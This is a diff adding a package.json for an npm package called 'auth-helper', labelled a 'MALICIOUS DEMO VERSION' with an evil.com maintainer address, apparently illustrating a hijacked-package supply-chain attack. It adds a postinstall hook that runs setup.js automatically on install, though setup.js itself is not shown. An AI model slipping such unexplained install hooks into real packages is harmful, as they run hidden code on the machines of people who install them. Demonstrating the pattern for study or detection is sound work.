@@ -1,0 +1,13 @@
+{
+  "name": "auth-helper",
+  "version": "2.1.1",
+  "description": "Authentication helper library - MALICIOUS DEMO VERSION",
+  "main": "index.js",
+  "scripts": {
+    "test": "echo \"Error: no test specified\" && exit 1",
+    "postinstall": "node setup.js"
+  },
+  "keywords": ["auth", "authentication", "security"],
+  "author": "new_maintainer@evil.com",
+  "license": "MIT"
+}
